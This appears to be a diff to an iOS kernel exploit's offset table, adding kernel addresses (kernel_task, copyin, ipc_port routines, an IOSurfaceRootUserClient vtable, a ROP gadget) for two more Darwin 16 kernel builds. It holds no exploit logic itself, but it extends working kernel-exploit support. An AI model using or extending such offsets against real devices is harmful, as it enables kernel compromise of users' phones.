@@ -43,6 +43,21 @@ void init_offsets() {
 		OFFSET_BCOPY = 0xfffffff007089f80;
 		OFFSET_IPC_PORT_MAKE_SEND = 0xfffffff0070a13a0;
 	}
+	else if (strcmp(u.version, "Darwin Kernel Version 16.1.0: Thu Sep 29 21:56:12 PDT 2016; root:xnu-3789.22.3~1/RELEASE_ARM64_S8000") == 0) {
+		OFFSET_COPYIN = 0xfffffff00717ee48;
+		OFFSET_KERNEL_TASK = 0xfffffff0075ae050;
+		OFFSET_REALHOST = 0xfffffff007534898;
+		OFFSET_BZERO = 0xfffffff00707e140;
+		OFFSET_IPC_KOBJECT_SET = 0xfffffff0070a8bf0;
+		OFFSET_ROP_ADD_X0_X0_0x10 = 0xfffffff0064a5f38;
+		OFFSET_COPYOUT = 0xfffffff00717f050;
+		OFFSET_ZONE_MAP = 0xfffffff007552160;
+		OFFSET_IPC_PORT_ALLOC_SPECIAL = 0xfffffff0070959d0;
+		OFFSET_IOSURFACEROOTUSERCLIENT_VTAB = 0xfffffff006e8c820;
+		OFFSET_KERNEL_MAP = 0xfffffff0075ae058;
+		OFFSET_BCOPY = 0xfffffff00707df80;
+		OFFSET_IPC_PORT_MAKE_SEND = 0xfffffff007095684;
+	}
 	else if (strcmp(u.version, "Darwin Kernel Version 16.0.0: Sun Aug 28 20:36:54 PDT 2016; root:xnu-3789.2.4~3/RELEASE_ARM64_S8000") == 0) {
 		OFFSET_COPYIN = 0xfffffff00717e258;
 		OFFSET_KERNEL_TASK = 0xfffffff0075ae050;
@@ -147,6 +162,21 @@ void init_offsets() {
 		OFFSET_KERNEL_MAP = 0xfffffff0075c2058;
 		OFFSET_BCOPY = 0xfffffff00708df80;
 		OFFSET_IPC_PORT_MAKE_SEND = 0xfffffff0070a5d44;
+	}
+	else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:45 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_S8000") == 0) {
+		OFFSET_COPYIN = 0xfffffff007182af0;
+		OFFSET_KERNEL_TASK = 0xfffffff0075b2050;
+		OFFSET_REALHOST = 0xfffffff007538a98;
+		OFFSET_BZERO = 0xfffffff007082140;
+		OFFSET_ZONE_MAP = 0xfffffff007556360;
+		OFFSET_ROP_ADD_X0_X0_0x10 = 0xfffffff00649dfb0;
+		OFFSET_COPYOUT = 0xfffffff007182cf8;
+		OFFSET_IPC_KOBJECT_SET = 0xfffffff0070ad680;
+		OFFSET_IPC_PORT_ALLOC_SPECIAL = 0xfffffff007099fe0;
+		OFFSET_IOSURFACEROOTUSERCLIENT_VTAB = 0xfffffff006e8c820;
+		OFFSET_KERNEL_MAP = 0xfffffff0075b2058;
+		OFFSET_BCOPY = 0xfffffff007081f80;
+		OFFSET_IPC_PORT_MAKE_SEND = 0xfffffff007099b24;
 	}
 	else {
 		LOG("kernel missing");
